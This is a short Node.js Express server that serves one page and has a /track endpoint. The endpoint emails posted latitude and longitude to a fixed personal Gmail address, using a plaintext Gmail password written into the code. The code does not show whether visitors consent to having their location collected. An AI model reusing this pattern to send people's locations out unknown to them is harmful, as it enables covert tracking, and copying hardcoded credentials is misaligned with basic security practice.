var express = require('express');
var nodemailer = require('nodemailer');
var bodyParser = require('body-parser');
var http = require('http');
var path = require('path');
var logger = require('morgan');

var app = express();
var port = process.env.PORT;

app.use(logger('dev'));
app.use(bodyParser.urlencoded({ extended: false })); // parse application/x-www-form-urlencoded
app.use(bodyParser.json()); // parse application/json
app.set('view engine','html');


app.get('*',function(req, res){
    console.log('entra al get');
    res.sendFile(path.join(__dirname,'index.html'));
});

app.get('/',function(req, res){    
    res.sendFile(path.join(__dirname,'index.html'));
});

app.get('/favicon.ico', function(req, res) {
    res.status(204);
});

app.post('/track', (req, res)=>{
    SendCoords(req.body.lat, req.body.lon);
    res.end();
})

function SendCoords(lat, lon) {
    // Not the movie transporter!
    var transporter = nodemailer.createTransport({
        service: 'Gmail',
        auth: {
            user: 'nodeveloperapi@gmail.com', // Your email id
            pass: '2017devel' // Your password
        }
    });

    var mailOptions = {
        from: 'nodeveloperapi@gmail.com', // sender address
        to: 'jhonemillan@gmail.com', // list of receivers
        subject: 'Coords', // Subject line
        text: 'lat: ' + lat + ' lon: ' + lon
        // html: '<b>Hello world ✔</b>' // You can choose to send an HTML body instead
    };
    
    transporter.sendMail(mailOptions, function(error, info){
     if(error) return error.message;

     if(info)
     {
         console.log(info);
     }
    });

}


app.listen(port,()=>{
    console.log('listening on port ' + port.toString());
})